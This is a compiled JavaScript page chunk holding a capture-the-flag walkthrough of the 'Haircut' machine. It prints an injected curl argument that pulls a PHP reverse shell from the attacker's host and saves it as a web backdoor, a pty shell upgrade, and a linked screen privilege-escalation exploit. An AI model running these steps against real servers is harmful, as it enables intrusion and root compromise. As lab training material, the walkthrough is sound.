(window.webpackJsonp=window.webpackJsonp||[]).push([[77],{418:function(e,t,s){"use strict";s.r(t);var a=s(13),r=Object(a.a)({},(function(){var e=this,t=e._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h1",{attrs:{id:"haircut"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#haircut"}},[e._v("#")]),e._v(" Haircut")]),e._v(" "),t("p",[e._v("IP: "),t("code",[e._v("10.10.10.24")])]),e._v(" "),t("h2",{attrs:{id:"recon"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#recon"}},[e._v("#")]),e._v(" Recon")]),e._v(" "),t("ul",[t("li",[e._v("Probably running "),t("code",[e._v("linux")])]),e._v(" "),t("li",[e._v("port 80: hardresser website\n"),t("ul",[t("li",[e._v("runs on nginx "),t("code",[e._v("nginx/1.10.0 (Ubuntu)")]),e._v(" "),t("ul",[t("li",[e._v("has paths: "),t("code",[e._v("hair.html")]),e._v(", "),t("code",[e._v("index.html")]),e._v(", and "),t("code",[e._v("test.html")])]),e._v(" "),t("li",[e._v("interseting path of "),t("code",[e._v("exposed.php")])]),e._v(" "),t("li",[e._v("the form is running "),t("code",[e._v("curl")]),e._v(" and we can insert commands in outlined "),t("a",{attrs:{href:"https://security.stackexchange.com/questions/198148/leveraging-curl-to-spawn-a-shell",target:"_blank",rel:"noopener noreferrer"}},[e._v("here"),t("OutboundLink")],1)])])])])])]),e._v(" "),t("h2",{attrs:{id:"port-80"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#port-80"}},[e._v("#")]),e._v(" Port 80")]),e._v(" "),t("p",[e._v("We can write files to the system by passing in:")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".14.21/php-reverse-shell.php "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-o")]),e._v(" /var/www/html/uploads/backdoor.php\n")])])]),t("p",[e._v("and navigating there, we get a reverse shell.")]),e._v(" "),t("h2",{attrs:{id:"priv-esc"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[e._v("#")]),e._v(" Priv esc")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[e._v("python3 "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-c")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[e._v("'import pty; pty.spawn(\"/bin/sh\")'")]),e._v("\n")])])]),t("p",[e._v("Using linpeas.sh, we find that there's a screen "),t("a",{attrs:{href:"https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh",target:"_blank",rel:"noopener noreferrer"}},[e._v("exploit"),t("OutboundLink")],1),e._v(".")]),e._v(" "),t("p",[e._v("This exploit doesn't work by running the script by itself since it gets some compile issues. So for the parts where the libraries are created, we do that locally then upload it to the box and then run individual commands on the machine.")]),e._v(" "),t("p",[e._v("Alternatively, to compile on the box, just add the location of cc1 path:")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("export")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t("span",{pre:!0,attrs:{class:"token environment constant"}},[e._v("PATH")])]),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),t("span",{pre:!0,attrs:{class:"token environment constant"}},[e._v("$PATH")]),e._v(":/usr/lib/gcc/x86_64-linux-gnu/5/\n")])])])])}),[],!1,null,null,null);t.default=r.exports}}]);